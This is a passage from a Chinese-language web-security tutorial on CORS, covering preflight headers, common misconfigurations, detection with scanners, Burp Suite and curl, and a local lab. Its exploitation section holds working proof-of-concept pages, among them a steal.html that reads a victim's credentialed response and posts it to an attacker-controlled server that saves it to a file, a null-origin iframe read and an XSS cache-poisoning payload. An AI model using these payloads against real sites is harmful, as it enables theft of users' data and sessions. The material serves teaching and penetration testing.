</code></pre>
<p>如果服务器否定了&quot;预检&quot;请求，会返回一个正常的 HTTP 回应，但是没有任何 CORS 相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被 XMLHttpRequest​​ ​对象的 onerror​​ ​回调函数捕获。控制台会打印出如下的报错信息。</p>
<pre><code class="lang-http">XMLHttpRequest cannot load http://api.alice.com.
Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin.
</code></pre>
<p>服务器回应的其他 CORS 相关字段如下。</p>
<pre><code class="lang-http"><span class="hljs-attribute">Access-Control-Allow-Methods</span><span class="hljs-punctuation">: </span>GET, POST, PUT
<span class="hljs-attribute">Access-Control-Allow-Headers</span><span class="hljs-punctuation">: </span>X-Custom-Header
<span class="hljs-attribute">Access-Control-Allow-Credentials</span><span class="hljs-punctuation">: </span>true
<span class="hljs-attribute">Access-Control-Max-Age</span><span class="hljs-punctuation">: </span>1728000
</code></pre>
<p>（1）Access-Control-Allow-Methods</p>
<p>该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次&quot;预检&quot;请求。</p>
<p>（2）Access-Control-Allow-Headers</p>
<p>如果浏览器请求包括 Access-Control-Request-Headers​ ​字段，则 Access-Control-Allow-Headers​ ​字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在&quot;预检&quot;中请求的字段。</p>
<p>（3）Access-Control-Allow-Credentials</p>
<p>该字段与简单请求时的含义相同。</p>
<p>（4）Access-Control-Max-Age</p>
<p>该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是 20 天（1728000 秒），即允许缓存该条回应 1728000 秒（即 20 天），在此期间，不用发出另一条预检请求。</p>
<h3 id="浏览器的正常请求和回应"><a name="浏览器的正常请求和回应" class="anchor-navigation-ex-anchor" href="#浏览器的正常请求和回应"><i class="fa fa-link" aria-hidden="true"></i></a>浏览器的正常请求和回应</h3>
<p>一旦服务器通过了&quot;预检&quot;请求，以后每次浏览器正常的 CORS 请求，就都跟简单请求一样，会有一个 Origin​​ ​头信息字段。服务器的回应，也都会有一个 Access-Control-Allow-Origin​​ ​头信息字段。</p>
<p>下面是&quot;预检&quot;请求之后，浏览器的正常 CORS 请求。</p>
<pre><code class="lang-http"><span class="hljs-keyword">PUT</span> <span class="hljs-string">/cors</span> <span class="hljs-meta">HTTP/1.1</span>
<span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://api.bob.com
<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>api.alice.com
<span class="hljs-attribute">X-Custom-Header</span><span class="hljs-punctuation">: </span>value
<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US
<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive
<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0...
</code></pre>
<p>上面头信息的 Origin​ ​字段是浏览器自动添加的。</p>
<p>下面是服务器正常的回应。</p>
<pre><code class="lang-http"><span class="hljs-attribute">Access-Control-Allow-Origin</span><span class="hljs-punctuation">: </span>http://api.bob.com
<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html; charset=utf-8
</code></pre>
<p>上面头信息中，Access-Control-Allow-Origin​ ​字段是每次回应都必定包含的。</p>
<h1 id="0x03-cors-错误配置类型"><a name="0x03-cors-错误配置类型" class="anchor-navigation-ex-anchor" href="#0x03-cors-错误配置类型"><i class="fa fa-link" aria-hidden="true"></i></a>0x03 CORS 错误配置类型</h1>
<h2 id="反射-origin-头"><a name="反射-origin-头" class="anchor-navigation-ex-anchor" href="#反射-origin-头"><i class="fa fa-link" aria-hidden="true"></i></a>反射 Origin 头</h2>
<p>如下配置：</p>
<pre><code class="lang-http"><span class="hljs-attribute">Access-Control-Allow-Origin</span><span class="hljs-punctuation">: </span>http://a.com, http://c.com
</code></pre>
<p>或者</p>
<pre><code class="lang-http"><span class="hljs-attribute">Access-Control-Allow-Origin</span><span class="hljs-punctuation">: </span>http://*.a.com
</code></pre>
<p>这两种域名事实上配置是错误的，因为 CORS 标准规定，Access-Control-Allow-Origin​​ 只能配置为单个 origin, null​​ 或 <code>*</code>​​。如果开发者想要实现同时与多个域名共享域名的需求，则需要专门编写代码或者使用框架来协助动态生成访问控制策略。</p>
<p>最简单地动态生成访问控制策略的方法，就是在 Access-Control-Allow-Origin 中反射请求的 Origin 值。例如，下面是一个错误 Nginx 配置示例：</p>
<pre><code class="lang-nginx">add_header &quot;Access-Control-Allow-Origin&quot; $http_origin; // 单纯的
add_header “Access-Control-Allow-Credentials” “true”;
</code></pre>
<p>这种配置非常危险，相当于信任任意网站，给攻击者网站敞开了大门。任意攻击者网站可以直接跨域读取其资源内容。</p>
<h2 id="origin-校验错误"><a name="origin-校验错误" class="anchor-navigation-ex-anchor" href="#origin-校验错误"><i class="fa fa-link" aria-hidden="true"></i></a>Origin 校验错误</h2>
<ul>
<li><strong>前缀匹配</strong>: 资源服务器在检查请求中 Origin 值时，只匹配了前缀。例如 www.example.com 想要允许 example.com 访问，但是只做了前缀匹配，导致同时信任了 example.com.attack.com 的访问，而 example.com.attack.com 是攻击者可以控制的网站。</li>
<li><strong>后缀匹配</strong>：资源服务器在检查请求中 Origin 值时，只做了后缀匹配。例如 www.example.com 想要允许 example.com 访问，由于后缀匹配出错，导致允许 attackexample.com 访问。</li>
<li><strong>没有转义</strong> <code>.</code>​​：例如，example.com 想要允许 www.example.com 访问时，但正则匹配没有转义 .​​，导致允许 wwwaexample.com 访问。</li>
<li><strong>包含匹配</strong>：我们还发现有的网站 www.example.com 想要允许 example.com，但是 Origin 校验出错，出现允许 ample.com 访问。</li>
</ul>
<h2 id="信任-null"><a name="信任-null" class="anchor-navigation-ex-anchor" href="#信任-null"><i class="fa fa-link" aria-hidden="true"></i></a>信任 null</h2>
<p>RFC 6564 规定，如果请求来自隐私敏感上下文时，Origin 头的值应该为 null，但是它却没有明确界定什么是隐私敏感上下文。</p>
<p>CORS 协议复用了 Origin 头，有些开发者在网站上配置信任 null，<strong>用于与本地 file 页面共享数据</strong>，如下所示：</p>
<pre><code class="lang-http"><span class="hljs-attribute">Access-Control-Allow-Origin</span><span class="hljs-punctuation">: </span>null
<span class="hljs-attribute">Access-Control-Allow-Credentials</span><span class="hljs-punctuation">: </span>true
</code></pre>
<p>但是事实上，除了本地 file 页面的跨域请求 Origin 头为 null 外，攻击者还可以从任意域下<strong>通过 iframe sandbox 构造 Origin 为 null 的跨域请求</strong>，如下是一段示意代码：</p>
<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">sandbox</span>=<span class="hljs-string">&quot;allow-scripts allow-top-navigation allow-forms&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&apos;data:text/html,&lt;script&gt;XMLHttpRequest here&lt;/script&gt;’&gt;&lt;/iframe&gt;
</span></span></code></pre>
<p>这就意味着任何配置有 Access-Control-Allow-Origin: null​​ ​和 Access-Control-Allow-Credentials:true​​ ​的网站等同于没有浏览器 SOP 的保护，都可以被其他任意域以这种方式读取内容。</p>
<p><strong>e.g.</strong></p>
<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">sandbox</span>=<span class="hljs-string">&quot;allow-scripts allow-top-navigation allow-forms&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&apos;data:text/html,&lt;script&gt;
var xhr=new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
        alert(xhr.responseText);
    }
}
xhr.open(&quot;GET&quot;, &quot;http://www.vuln.com:8081/cors/corsvuln.jsp&quot;, true);
xhr.withCredentials = true;
xhr.send();&lt;/script&gt;&apos;</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span>
</code></pre>
<h2 id="https-域信任-http-域"><a name="https-域信任-http-域" class="anchor-navigation-ex-anchor" href="#https-域信任-http-域"><i class="fa fa-link" aria-hidden="true"></i></a>HTTPS 域信任 HTTP 域</h2>
<p>中间人攻击者可以先劫持受信任 HTTP 域，然后通过这个域发送跨域请求到 HTTPS 网站，间接读取 HTTPS 域下的受保护内容。</p>
<p><img src="assets/CORS%20跨域漏洞-4.png" alt></p>
<h2 id="信任自身全部子域"><a name="信任自身全部子域" class="anchor-navigation-ex-anchor" href="#信任自身全部子域"><i class="fa fa-link" aria-hidden="true"></i></a>信任自身全部子域</h2>
<p>很多网站为了方便会将 CORS 配置为信任全部自身子域，这种配置会导致子域 XSS 的危害被强化。为了防止某个子域上 XSS 漏洞的危害其他子域，浏览器设计了 Cookie 的 httponly 标志，用于限制 Javascript 读取 Cookie，因此某个子域 XSS 不能读取带有 httponly 标记的 Cookie，难以窃取其他重要子域上的敏感内容。 但是如果这个域配置了 CORS 且信任全部子域，那么攻击者可以利用其他任意子域上 XSS 漏洞，发送跨域请求到目标重要域网站，从而获取敏感内容。</p>
<h2 id="​origin​​​-与-credentialstrue​​​-共用"><a name="​origin​​​-与-credentialstrue​​​-共用" class="anchor-navigation-ex-anchor" href="#​origin​​​-与-credentialstrue​​​-共用"><i class="fa fa-link" aria-hidden="true"></i></a>​<code>Origin:*​​​</code> 与 <code>Credentials:true</code>​​​ 共用</h2>
<p>CORS 规定，<code>Access-Control-Allow-Origin:*</code>​​ 与 <code>Access-Control-Allow-Credentials:true</code>​​ 不能同时使用。浏览器会对下面这种误配置报错：</p>
<pre><code class="lang-http"><span class="hljs-attribute">Access-Control-Allow-Origin</span><span class="hljs-punctuation">: </span>* 
<span class="hljs-attribute">Access-Control-Allow-Credentials</span><span class="hljs-punctuation">: </span>true
</code></pre>
<p>这就意味着，<code>Access-Control-Allow-Origin:*</code>​​ 只能用于共享公开资源。</p>
<h2 id="缺少-varyorigin​​​-头"><a name="缺少-varyorigin​​​-头" class="anchor-navigation-ex-anchor" href="#缺少-varyorigin​​​-头"><i class="fa fa-link" aria-hidden="true"></i></a>缺少 <code>Vary:Origin</code>​​​ 头</h2>
<p>当资源服务器需要共享多个域名时，它需要每个不同请求域的跨域请求生成不同的访问控制策略。但一旦这个资源内容需要被缓存，则会带来 CORS 失效问题。例如，c.com 同时允许 a.com 和 b.com 共享。c.com 资源内容首先被 a.com 脚本跨域访问后被缓存，其中缓存响应头为 Access-Control-Allow-Origin: <a href="http://a.com​​”。这时，b.com" target="_blank">http://a.com​​”。这时，b.com</a> 脚本则不能读取缓存响应内容，因为缓存响应头是允许 a.com 共享，而不是 b.com。HTTP 协议提供了 Vary 头，用于解决这种情况，资源服务器需要在响应头中配置 <code>Vary:Origin</code>​​ <strong>头来指导缓存，为每个不同的 Origin 头缓存一份不同的内容</strong>。</p>
<h1 id="0x04-挖掘利用"><a name="0x04-挖掘利用" class="anchor-navigation-ex-anchor" href="#0x04-挖掘利用"><i class="fa fa-link" aria-hidden="true"></i></a>0x04 挖掘利用</h1>
<p>CORS 的漏洞主要看当我们发起的请求中带有 Origin 头部字段时，服务器的返回包带有 CORS 的相关字段并且允许 Origin 的域访问。</p>
<p><strong>变换请求头的 origin 字段，如果返回包中的 Access-Control-Allow-Origin​​ 内容和发送的 origin 头内容相同，则存在此问题。</strong></p>
<p><strong>利用</strong></p>
<ul>
<li>前提：含有 CORS 配置的网站</li>
<li>利用 html 标签和表单发送请求</li>
<li>访问内网敏感资源</li>
<li>绕过返会话劫持</li>
</ul>
<p><strong>一般形式跨域请求利用</strong></p>
<p>在攻击者自己控制的网页上嵌入跨域请求，用户访问链接，执行了跨域请求，从而攻击目标。</p>
<h2 id="方法一：检测工具"><a name="方法一：检测工具" class="anchor-navigation-ex-anchor" href="#方法一：检测工具"><i class="fa fa-link" aria-hidden="true"></i></a>方法一：检测工具</h2>
<ul>
<li><a href="https://github.com/chenjj/CORScanner" target="_blank">GitHub - chenjj/CORScanner: 🎯 Fast CORS misconfiguration vulnerabilities scanner</a></li>
</ul>
<h3 id="exp--poc"><a name="exp--poc" class="anchor-navigation-ex-anchor" href="#exp--poc"><i class="fa fa-link" aria-hidden="true"></i></a>EXP &amp; POC</h3>
<pre><code class="lang-html"><span class="hljs-comment">&lt;!-- mob.exp/steal.html  --&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello,this is evil page. <span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>CORS POC Exploit<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;demo&quot;</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;corsExploit()&quot;</span>&gt;</span>Exploit<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript">
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">corsExploit</span>(<span class="hljs-params"></span>) </span>{
        <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> XMLHttpRequest();

        xhr.onreadystatechange = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>{
            <span class="hljs-keyword">if</span> (xhr.readyState == <span class="hljs-number">4</span> &amp;&amp; xhr.status == <span class="hljs-number">200</span>) <span class="hljs-comment">//if receive xhr response</span>
            {
                <span class="hljs-comment">//var datas=xhr.responseText;</span>
                <span class="hljs-comment">//alert(datas);</span>
                <span class="hljs-comment">//document.getElementById(&quot;demo&quot;).innerHTML = alert(this.responseText);</span>
                <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;demo&quot;</span>).innerHTML = alert(xhr.responseText);

            }
        }
        <span class="hljs-comment">// request vuln page，需要攻击的目标</span>
        xhr.open(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;http://www.vuln.com:8081/cors/corsvuln.jsp&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>)
        xhr.send();
    }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<h3 id="绕过-httponly-获取-cookie"><a name="绕过-httponly-获取-cookie" class="anchor-navigation-ex-anchor" href="#绕过-httponly-获取-cookie"><i class="fa fa-link" aria-hidden="true"></i></a>绕过 http_only 获取 cookie</h3>
<ol>
<li>在攻击这服务器创建 cookiebypass.jsp​​</li>
</ol>
<pre><code class="lang-java">&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> contentType=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span> %&gt;
&lt;%
    String res = request.getParameter(<span class="hljs-string">&quot;ck&quot;</span>);

    String fileName = <span class="hljs-string">&quot;secrect.html&quot;</span>;
    String webPath = application.getRealPath(<span class="hljs-string">&quot;/&quot;</span>);
    String filePath = webPath + fileName;

    <span class="hljs-keyword">try</span> {
        java.io.FileWriter fileWriter = <span class="hljs-keyword">new</span> java.io.FileWriter(filePath);
        fileWriter.write(res);
        fileWriter.close();
        out.println(<span class="hljs-string">&quot;File created successfully.&quot;</span>);
    } <span class="hljs-keyword">catch</span> (java.io.IOException e) {
        out.println(<span class="hljs-string">&quot;Error occurred while creating the file.&quot;</span>);
        e.printStackTrace();
    }
%&gt;
</code></pre>
<ol>
<li>在攻击者可控网站创建 steal.html​​</li>
</ol>
<pre><code class="lang-html"><span class="hljs-meta">&lt;!DOCTYPE&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>cors exploit<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript">
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">exploit</span>(<span class="hljs-params"></span>) </span>{
        <span class="hljs-keyword">var</span> xhr1;
        <span class="hljs-keyword">var</span> xhr2;
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">window</span>.XMLHttpRequest) {
            xhr1 = <span class="hljs-keyword">new</span> XMLHttpRequest();
            xhr2 = <span class="hljs-keyword">new</span> XMLHttpRequest();
        } <span class="hljs-keyword">else</span> {
            xhr1 = <span class="hljs-keyword">new</span> ActiveXObject(<span class="hljs-string">&quot;Microsoft.XMLHTTP&quot;</span>);
            xhr2 = <span class="hljs-keyword">new</span> ActiveXObject(<span class="hljs-string">&quot;Microsoft.XMLHTTP&quot;</span>);
        }
        xhr1.onreadystatechange = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>{
            <span class="hljs-keyword">if</span> (xhr1.readyState == <span class="hljs-number">4</span> &amp;&amp; xhr1.status == <span class="hljs-number">200</span>) {
                <span class="hljs-keyword">var</span> datas = xhr1.responseText;
                <span class="hljs-comment">// 攻击这服务器地址</span>
                xhr2.open(<span class="hljs-string">&quot;POST&quot;</span>, <span class="hljs-string">&quot;http://mob.exp:8081/manager/cookiebypass.jsp&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>);
                xhr2.setRequestHeader(<span class="hljs-string">&quot;Content-type&quot;</span>, <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);
                xhr2.send(<span class="hljs-string">&quot;ck=&quot;</span> + <span class="hljs-built_in">escape</span>(datas));
            }
        }
        <span class="hljs-comment">// 需要攻击的目标</span>
        xhr1.open(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;http://www.vuln.com:8081/cors/corsvuln.jsp&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>)
        xhr1.withCredentials = <span class="hljs-literal">true</span>;
        xhr1.send();
    }

    exploit();
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>访问 <a href="http://mob.exp:8081/manager/steal.html" target="_blank">mob.exp:8081/manager/steal.html</a>，可以看到返回内容写入 secrect.html 中。</p>
<p><img src="assets/CORS%20跨域漏洞-5.png" alt></p>
<h2 id="方法二：利用-burpsuit"><a name="方法二：利用-burpsuit" class="anchor-navigation-ex-anchor" href="#方法二：利用-burpsuit"><i class="fa fa-link" aria-hidden="true"></i></a>方法二：利用 Burpsuit</h2>
<p>搭建测试环境，Nginx 配置如下：</p>
<p><img src="assets/CORS%20跨域漏洞-6.png" alt></p>
<ol>
<li><p>选择 <code>Proxy -- Options -- Match and Replace</code>，勾选 Request header。</p>
<p> 将空替换为 Origin:foo.example.org​​​ 的 Enable 框。</p>
<p> 然后在网站一阵乱点，最后在 HTTP history 来筛选带有 CORS 头部的值，然后用以上工具查看是否有配置缺陷。</p>
</li>
</ol>
<p><img src="assets/CORS%20跨域漏洞-7.png" alt></p>
<ol>
<li>Burpsuite：自动在 HTTP 请求包中加上 Origin 的头部字段。</li>
</ol>
<p><img src="assets/CORS%20跨域漏洞-8.png" alt></p>
<ol>
<li>在 Filter by search term 中输入：<code>Access-Control-Allow-Origin: foo.example.org​​</code></li>
</ol>
<p><img src="assets/CORS%20跨域漏洞-9.png" alt></p>
<ol>
<li>HTTP history 列表中出现符合条件的请求包，点击 Ctrl+R（发送到 Repeater），点击 GO，观察返回的 CORS 配置。</li>
</ol>
<p><img src="assets/CORS%20跨域漏洞-10.png" alt></p>
<h2 id="方法三：curl-命令"><a name="方法三：curl-命令" class="anchor-navigation-ex-anchor" href="#方法三：curl-命令"><i class="fa fa-link" aria-hidden="true"></i></a>方法三：curl 命令</h2>
<p>curl 命令，输入</p>
<pre><code class="lang-shell">curl http://127.0.0.1/DoraBox-master/csrf/userinfo.php -H &quot;Origin:https://example.com/&quot; -I
</code></pre>
<p><img src="assets/CORS%20跨域漏洞-11.png" alt></p>
<h2 id="方法四：浏览器测试"><a name="方法四：浏览器测试" class="anchor-navigation-ex-anchor" href="#方法四：浏览器测试"><i class="fa fa-link" aria-hidden="true"></i></a>方法四：浏览器测试</h2>
<p>利用 Ajax 发送一个简单请求，看是否允许。</p>
<pre><code class="lang-javascript">var url = &apos;http://172.16.10.113/xxxxmail&apos;;
var xhr = new XMLHttpRequest();
xhr.open(&apos;GET&apos;, url, true);
xhr.send();

// 或者
$.get(&quot;http://172.16.10.113/xxxxmail&quot;)

========
# 浏览器控制台示例
# 在服务器（被攻击目标） 192.168.202.110 上配置有漏洞的 nginx.conf
# 打开攻击者的网站 http://xxx.xxx.xxx/，（或者随便一个网站）再打开控制台
# 在允许的域（网站），打开控制台
$.get(&quot;http://192.168.202.110:8081&quot;)
{readyState: 1, getResponseHeader: ƒ, getAllResponseHeaders: ƒ, setRequestHeader: ƒ, overrideMimeType: ƒ, …}

# 不允许的域
$.get(&quot;http://192.168.202.110:8081&quot;)
{readyState: 1, getResponseHeader: ƒ, getAllResponseHeaders: ƒ, setRequestHeader: ƒ, overrideMimeType: ƒ, …}
/xxxmail/xxx4/index.jsp Access to XMLHttpRequest at &apos;http://192.168.202.110:8081/&apos; from origin &apos;http://172.16.10.113&apos; has been blocked by CORS policy: The &apos;Access-Control-Allow-Origin&apos; header has a value &apos;http://mt.icoremail.net&apos; that is not equal to the supplied origin.
loginCommon.c2f53.js:1     GET http://192.168.202.110:8081/ net::ERR_FAILED 200 (OK)
send @
</code></pre>
<p><img src="assets/CORS%20跨域漏洞-12.png" alt></p>
<p><img src="assets/CORS%20跨域漏洞-13.png" alt></p>
<h2 id="实验测试"><a name="实验测试" class="anchor-navigation-ex-anchor" href="#实验测试"><i class="fa fa-link" aria-hidden="true"></i></a>实验测试</h2>
<p><strong>环境准备</strong></p>
<p>我们首先修改 host 文件，加上</p>
<pre><code class="lang-text">127.0.0.1 mob.exp
127.0.0.1 www.vuln.com
</code></pre>
<p>这样我们访问 www.vuln.com 就相当于服务端。服务端新建 corsvuln.jsp。</p>
<pre><code class="lang-java">&lt;!-- http://www.vuln.com:8081/cors/corsvuln.jsp --&gt;
&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot; %&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;Vulnerability Page&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;%
  out.println(&quot;username: admin; password: 123456&quot;);
%&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p><img src="assets/CORS%20跨域漏洞-14.png" alt></p>
<p>接着在 hacker 端 mob.exp 构造 steal.html，这里我们假设是 <a href="http://mob.exp:8081/manager/steal.html" target="_blank">http://mob.exp:8081/manager/steal.html</a></p>
<pre><code class="lang-html"><span class="hljs-comment">&lt;!-- mob.exp/steal.html  --&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello,this is evil page. <span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript">
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loadXMLDoc</span>(<span class="hljs-params"></span>)
</span>{
    <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> XMLHttpRequest();

    xhr.onreadystatechange=<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)
    </span>{
        <span class="hljs-keyword">if</span>(xhr.readyState == <span class="hljs-number">4</span> &amp;&amp; xhr.status == <span class="hljs-number">200</span>) <span class="hljs-comment">//if receive xhr response</span>
        {
            <span class="hljs-keyword">var</span> datas=xhr.responseText;
            alert(datas);
        }
    }
    <span class="hljs-comment">// request vuln page，存在漏洞的攻击目标</span>
    xhr.open(<span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;http://www.vuln.com:8081/cors/corsvuln.jsp&quot;</span>,<span class="hljs-string">&quot;true&quot;</span>) 
    xhr.send();
}
loadXMLDoc();
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p><img src="assets/CORS%20跨域漏洞-15.png" alt></p>
<p>根据同源策略，这是不允许的，结果也和我们想的一样。</p>
<p><strong>上面说过，同源策略并不限制请求的发起和响应，只是浏览器拒绝了 js 对响应资源的操作，这点我们抓包就可以看出来。（所以说测试方法中的 1 是不对的）</strong></p>
<p><img src="assets/CORS%20跨域漏洞-16.png" alt></p>
<p>我们修改 corsvuln.jsp 使用 CORS 使其可以跨域访问，添加一个 Access-Control-Allow-Origin 的返回头。</p>
<pre><code class="lang-java">response.setHeader(<span class="hljs-string">&quot;Access-Control-Allow-Origin&quot;</span>, <span class="hljs-string">&quot;http://mob.exp:8081&quot;</span>);
</code></pre>
<p>再次访问 <a href="http://mob.exp:8081/manager/steal.html" target="_blank">mob.exp:8081/manager/steal.html</a> 发现可以正常 alert 了，成功实现了跨域资源的请求。</p>
<p><img src="assets/CORS%20跨域漏洞-17.png" alt></p>
<p>我们只是在响应头加上了 <code>Access-Control-Allow-Origin: http://mob.exp:8081​​</code> 浏览器看到这个，认为这是服务端允许的跨域请求，就不再阻拦 js 对获取内容的操作了。</p>
<p><img src="assets/CORS%20跨域漏洞-18.png" alt></p>
<h2 id="获取用户凭证"><a name="获取用户凭证" class="anchor-navigation-ex-anchor" href="#获取用户凭证"><i class="fa fa-link" aria-hidden="true"></i></a>获取用户凭证</h2>
<p><strong>方式一：存在用户凭证</strong></p>
<table>
<thead>
<tr>
<th>Access-Control-Allow-Origin</th>
<th>“访问控制允许凭据”值</th>
<th>是否可利用</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>攻击者掌握的域名</td>
<td>真的</td>
<td>是</td>
<td></td>
</tr>
<tr>
<td><code>*</code></td>
<td>真的</td>
<td>否</td>
<td>浏览器报错</td>
</tr>
<tr>
<td>null（空值）</td>
<td>真的</td>
<td>是</td>
<td>任意网站使用沙盒 iframe 来获取 <code>null</code> 源</td>
</tr>
</tbody>
</table>
<p>搜狐视频 CORS 误配置漏洞演示：<a href="https://www.youtube.com/watch?v=PWbPbtyyNi8" target="_blank">https://www.youtube.com/watch?v=PWbPbtyyNi8</a></p>
<p><strong>方式二：不存在用户凭证</strong></p>
<table>
<thead>
<tr>
<th>Access-Control-Allow-Origin</th>
<th>是否可利用</th>
</tr>
</thead>
<tbody>
<tr>
<td>攻击者掌握的域名</td>
<td>是</td>
</tr>
<tr>
<td>null（空值）</td>
<td>是</td>
</tr>
<tr>
<td><code>*</code></td>
<td>是</td>
</tr>
</tbody>
</table>
<h2 id="绕过基于-ip-的认证"><a name="绕过基于-ip-的认证" class="anchor-navigation-ex-anchor" href="#绕过基于-ip-的认证"><i class="fa fa-link" aria-hidden="true"></i></a>绕过基于 IP 的认证</h2>
<p>如果目标应用程序与受害者的网络可达性，并且目标应用程序使用 IP 地址作为身份验证的方式，则黑客会利用受害者的浏览器作为代理去访问那些目标应用程序并且可以绕过那些基于 IP 的身份验证。</p>
<h2 id="客户端缓存中毒"><a name="客户端缓存中毒" class="anchor-navigation-ex-anchor" href="#客户端缓存中毒"><i class="fa fa-link" aria-hidden="true"></i></a>客户端缓存中毒</h2>
<p>例如，数据报文头部中包含 <code>X-User</code> 标头，其值未进行任何输入验证，输出编码。</p>
<ol>
<li>请求包</li>
</ol>
<pre><code class="lang-http">GET /login HTTP/1.1 
Host: www.target.local 
Origin: https://attacker.domain/ 
X-User: &lt;svg/onload=alert(1)&gt;
</code></pre>
<ol>
<li>响应包
 <code>Access-Control-Allow-Origin</code> 已被设置，<code>Access-Control-Allow-Credentials: true</code> 与 <code>Vary: Origin</code> 头已经设置。</li>
</ol>
<pre><code class="lang-http">HTTP/1.1 200 OK 
Access-Control-Allow-Origin: https://attacker.domain/ 
… 
Content-Type: text/html 
… 
Invalid user: &lt;svg/onload=alert(1)&gt;
</code></pre>
<ol>
<li>构造存在恶意的 XSS 有效负载页面，诱使受害者触发。</li>
</ol>
<pre><code class="lang-JavaScript"><span class="hljs-keyword">var</span> req = <span class="hljs-keyword">new</span> XMLHttpRequest(); 
req.onload = reqListener; req.open(<span class="hljs-string">&apos;get&apos;</span>,<span class="hljs-string">&apos;http://www.target.local/login&apos;</span>,<span class="hljs-literal">true</span>); 
req.setRequestHeader(<span class="hljs-string">&apos;X-User&apos;</span>, <span class="hljs-string">&apos;&lt;svg/onload=alert(1)&gt;&apos;</span>);
req.send(); 
